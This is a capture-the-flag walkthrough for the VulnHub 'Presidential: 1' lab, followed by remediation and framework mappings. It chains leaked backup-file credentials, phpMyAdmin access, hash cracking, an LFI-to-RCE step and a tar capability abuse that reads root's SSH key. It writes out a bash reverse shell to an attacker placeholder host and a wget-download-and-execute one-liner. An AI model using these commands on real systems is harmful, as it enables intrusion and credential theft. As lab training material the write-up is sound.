# Presidential: 1 — The Ballot is Cast, the Root is Yours

Look at this one, dude! Presidential: 1 puts you in the role of a security researcher auditing a fictional US presidential election web infrastructure. The machine is legitimately hard: a backup config file leaks database credentials, phpMyAdmin exposes a hash that John cracks, an LFI-to-RCE chain gets you a shell, and then a Linux capability on `tar` (cap_dac_read_search) lets you read root's SSH private key. The final play: SSH in as root. Clean, layered, and every step has a real-world equivalent found in actual production environments.

Big respect to Syed Umar Arfeen for designing a machine where the theme enhances the realism rather than being decorative.

| Field | Value |
|---|---|
| **Level** | Hard |
| **Target VM** | Presidential: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/presidential-1,504/ |
| **Techniques** | vhost enumeration, backup file exposure, hash cracking (John the Ripper), phpMyAdmin LFI/RCE, Linux capabilities abuse (cap_dac_read_search on tar), SSH private key extraction |
| **CVEs** | CWE-200 (backup config file exposure), CWE-269 (Linux capabilities misconfiguration), CWE-916 (insufficient password hashing) |
| **APT Groups** | APT29 (Cozy Bear, known for targeting election infrastructure and government web applications); APT28 (Fancy Bear, uses backup file discovery and credential dumping in government network intrusions) |

---

## Attack Summary

```
nmap → HTTP (80), HTTPS (443)
  → Browse http://target/ → email on site → domain: votenow.local
  → /etc/hosts: add votenow.local
  → gobuster -x bak,php → config.php.bak → DB credentials
  → gobuster vhost → datasafe.votenow.local
  → /etc/hosts: add datasafe.votenow.local
  → http://datasafe.votenow.local/phpmyadmin/ → login with DB creds
  → admin password hash in DB → John the Ripper → cracked
  → phpMyAdmin LFI → session cookie injection → PHP RCE
  → reverse shell as apache/www-data
  → su admin (password reuse) → user.txt
  → getcap -r / → /usr/bin/tar = cap_dac_read_search+ep
  → tar -cvf /tmp/id_rsa.tar /root/.ssh/id_rsa
  → tar -xvf /tmp/id_rsa.tar → read private key
  → ssh -i root_id_rsa root@target → root
  → cat /root/root.txt
```

---

## Methodology

1. Host discovery and full port scan
2. Domain name discovery from web site content
3. File enumeration: discover config.php.bak with database credentials
4. Virtual host enumeration to find phpMyAdmin subdomain
5. phpMyAdmin login with database credentials
6. Hash cracking with John the Ripper for admin password
7. phpMyAdmin LFI/RCE exploitation for reverse shell
8. Shell stabilization
9. User flag capture via su admin (password reuse)
10. Linux capabilities enumeration
11. cap_dac_read_search on tar: extract root SSH private key
12. SSH login as root and root flag capture

---

## Step 1 — Host Discovery and Full Port Scan

```bash
sudo netdiscover -i eth0
# Target: 192.168.10.172

nmap -A -p- 192.168.10.172
```

```
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.x
443/tcp open  https   Apache httpd 2.4.x
```

Both ports serve web content. HTTP may redirect to HTTPS. Start with browsing the site manually to gather information before running automated tools.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Domain Discovery and /etc/hosts Configuration

Browse to `http://192.168.10.172`. The site is a fictional presidential election page. Inspect the site for email addresses, contact details, or any text that reveals the domain:

```bash
curl -s http://192.168.10.172 | grep -i "@\|domain\|votenow"
```

An email address on the page reveals the domain name (e.g., `admin@votenow.local`). Add it to `/etc/hosts`:

```bash
echo "192.168.10.172 votenow.local" >> /etc/hosts
```

**MITRE ATT&CK:** T1590 — Gather Victim Network Information

---

## Step 3 — File Enumeration: Backup Config Discovery

Run gobuster with backup file extensions:

```bash
gobuster dir \
    -u http://votenow.local/ \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,bak,old,backup \
    -t 40 \
    -o /tmp/gobusting.txt
```

**Hit:** `config.php.bak` — a forgotten backup of the application configuration file.

```bash
curl http://votenow.local/config.php.bak
```

```php
<?php
$dbHost = "localhost";
$dbUsername = "votebox";
$dbPassword = "casoj3$$swaaccepted";
$dbName = "votebox";
?>
```

Database credentials extracted: `votebox` / `casoj3$$swaaccepted`.

**Real-world note:** Backup files with `.bak`, `.old`, `.php~`, or `.orig` extensions are among the most consistently found issues in web application penetration tests. Developers create these during maintenance and forget to delete them. APT28 specifically searches for backup and configuration files during initial reconnaissance of government web infrastructure.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1083 — File and Directory Discovery

---

## Step 4 — Virtual Host Enumeration

Enumerate virtual hosts to discover any subdomains:

```bash
gobuster vhost \
    -u http://votenow.local/ \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    --append-domain
```

**Hit:** `datasafe.votenow.local` — add to `/etc/hosts`:

```bash
echo "192.168.10.172 datasafe.votenow.local" >> /etc/hosts
```

Browse to `http://datasafe.votenow.local/phpmyadmin/` — a phpMyAdmin panel loads.

**Alternative:** `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://votenow.local/ -H "Host: FUZZ.votenow.local" -fc 404`

**MITRE ATT&CK:** T1590 — Gather Victim Network Information; T1083 — File and Directory Discovery

---

## Step 5 — phpMyAdmin Login and Hash Cracking

Log in to phpMyAdmin using the database credentials from `config.php.bak`:

```
Username: votebox
Password: casoj3$$swaaccepted
```

Browse the database tables. Find the `admin` user table containing a password hash.

Save the hash:

```bash
echo 'admin:<hash_value>' > /tmp/admin.hash
```

Crack with John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/admin.hash
john --show /tmp/admin.hash
```

Admin password cracked.

**Alternative:** `hashcat -m 0 /tmp/admin.hash /usr/share/wordlists/rockyou.txt -d 1 -w 3` — use the NVIDIA CUDA device for speed.

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking; T1078 — Valid Accounts

---

## Step 6 — phpMyAdmin LFI/RCE and Reverse Shell

Log in to phpMyAdmin with the cracked admin credentials.

The phpMyAdmin version allows an authenticated user to achieve code execution via session file injection and LFI:

1. Authenticate to phpMyAdmin as admin
2. Create a malicious PHP session by injecting PHP code via a crafted SQL query or session manipulation
3. Include the session file via the LFI parameter to execute the PHP code

Create a shell script on the attacker:

```bash
cat > /tmp/shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/LHOST/4444 0>&1
EOF
chmod +x /tmp/shell.sh
```

Serve it:

```bash
python3 -m http.server 8080
```

Start the listener:

```bash
nc -lvnp 4444
```

Through the phpMyAdmin RCE, execute:

```bash
wget http://LHOST:8080/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

Reverse shell received. Stabilize:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

Attempt to switch to admin using the cracked password:

```bash
su admin
# Use the cracked password
cat ~/user.txt
cat ~/notes.txt
```

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Step 7 — Linux Capabilities Enumeration

Enumerate all Linux capabilities set on binaries:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/tar = cap_dac_read_search+ep
```

`cap_dac_read_search` allows the binary to bypass all DAC (Discretionary Access Control) read permission checks. Combined with `+ep` (effective and permitted), `tar` can read any file on the filesystem, including files owned by root with no read permission for others.

**Real-world note:** Linux capabilities are a finer-grained alternative to SUID, but they are just as dangerous when misapplied. Many system administrators set capabilities without understanding the implications. `cap_dac_read_search` on a file archiver is essentially a mechanism to read any file on the system. This finding appears in cloud provider instances, Kubernetes nodes, and containerized environments with misconfigured init scripts.

**MITRE ATT&CK:** T1548 — Abuse Elevation Control Mechanism; T1083 — File and Directory Discovery

---

## Step 8 — Extract Root SSH Key via tar Capability

Use `tar` with `cap_dac_read_search` to read root's private SSH key:

```bash
# Archive root's .ssh directory (capability bypasses permission check)
tar -cvf /tmp/id_rsa.tar /root/.ssh/id_rsa

# Decompress in a writable directory
cd /tmp && tar -xvf id_rsa.tar

# Read the private key
cat /tmp/root/.ssh/id_rsa
```

Copy the key content. On the attacker machine:

```bash
vim /tmp/root_key
# Paste the private key content
chmod 600 /tmp/root_key
```

**MITRE ATT&CK:** T1552.004 — Credentials in Files: Private Keys

---

## Step 9 — SSH Login as Root and Flag Capture

```bash
ssh -i /tmp/root_key root@192.168.10.172
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. The election is over, and you won.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH; T1078 — Valid Accounts

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| DB Credential | votebox:(password) | config.php.bak (web root) | phpMyAdmin login |
| Admin Hash | (MD5 hash) | phpMyAdmin database table | John cracking |
| Admin Password | (cracked) | John the Ripper rockyou | phpMyAdmin RCE + su admin |
| Root SSH Key | RSA private key | /root/.ssh/id_rsa via tar cap | SSH login as root |
| User Flag | user.txt | /home/admin/user.txt | Captured after su admin |
| Root Flag | root.txt | /root/root.txt | Captured after SSH as root |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | config.php.bak in web root exposes DB credentials | Backup files in web-accessible directories are a top finding in web app pentests | Add *.bak, *.old, *.php~ to web server deny rules; automate backup file detection in CI/CD |
| 2 | phpMyAdmin exposed on public subdomain | phpMyAdmin should never be publicly accessible without IP restriction | Restrict phpMyAdmin to localhost or VPN; require MFA; use IP allowlist |
| 3 | Admin password hash cracked with rockyou | Weak passwords stored as MD5/SHA1 are immediately crackable | Use bcrypt/argon2 for password storage; enforce strong passwords (12+ chars) |
| 4 | Password reuse: DB password reused for system account | Single credential compromise unlocked two authentication layers | Unique passwords per service; deploy a PAM solution; audit reuse |
| 5 | cap_dac_read_search on /usr/bin/tar bypasses all file permissions | Linux capabilities on file archivers grant filesystem read-everything access | Audit capabilities with getcap -r / after any system change; remove unnecessary capabilities |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Gathering | Gather Victim Network Information | T1590 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Credential Access | Credential Access | Credentials in Files: Private Keys | T1552.004 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Initial Access | Access | Valid Accounts | T1078 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove config.php.bak from web root** — add `*.bak` to web server deny rules; automate backup cleanup in deployment scripts
2. **Restrict phpMyAdmin access** — bind to localhost only; require VPN or IP allowlist for access
3. **Use strong password hashing** — migrate to bcrypt or argon2 from MD5/SHA1
4. **Enforce unique passwords** — no reuse between database, system, and web application accounts
5. **Remove cap_dac_read_search from tar** — `setcap -r /usr/bin/tar`; audit all Linux capabilities quarterly
6. **Disable root SSH login** — `PermitRootLogin no` in sshd_config; use key-only authentication for sudo users

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory phpMyAdmin instances; audit web-accessible backup files |
| Protect | Access Control | Restrict phpMyAdmin; disable root SSH; IP allowlist |
| Protect | Data Security | Remove backup files from web root; use strong password hashing |
| Detect | Anomalies and Events | Alert on phpMyAdmin login attempts; monitor capability abuse |
| Respond | Response Planning | Rotate all exposed credentials; remove backup files; revoke compromised SSH keys |
| Recover | Recovery Planning | Rebuild compromised host; audit all Linux capabilities |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict phpMyAdmin; require auth for all admin tools |
| AC-6 | Least Privilege | Remove cap_dac_read_search; disable root SSH |
| IA-5 | Authenticator Management | Strong passwords; bcrypt storage; rotate exposed credentials |
| CM-7 | Least Functionality | No phpMyAdmin on public subdomain; no backup files in web root |
| SC-28 | Protection of Information at Rest | No credentials in web-accessible files |
| SC-8 | Transmission Confidentiality | TLS on all phpMyAdmin endpoints |

### CISA KEV

phpMyAdmin vulnerabilities and credential exposure via web application backup files are both flagged in CISA Alert AA22-074A. Organizations with web-facing database administration interfaces should apply immediate remediation per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Credentials | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage Configuration | MIL2 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (restrict phpMyAdmin; remove backup files)
- **D3-OAM** — Operating System Administrative Management (remove Linux capabilities; audit SUID/capabilities)
- **D3-HBPI** — Harden Build Pipeline Integrity (automate backup cleanup in deployment pipeline)

---

## Final Thoughts

Presidential: 1 is a masterclass in layered credential exposure. Every step peels back another layer of the onion: backup file → DB creds → phpMyAdmin → hash → system access → capabilities → root SSH key → root. Each layer is a real finding in real environments. Election security is a legitimately critical domain, and the machine's theme makes every step feel meaningful.

The Linux capabilities angle deserves special attention: `getcap -r /` is not in every pentester's initial enumeration script, but it should be. After completing this machine, it will be in yours.

Legit top-tier box. No cap. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
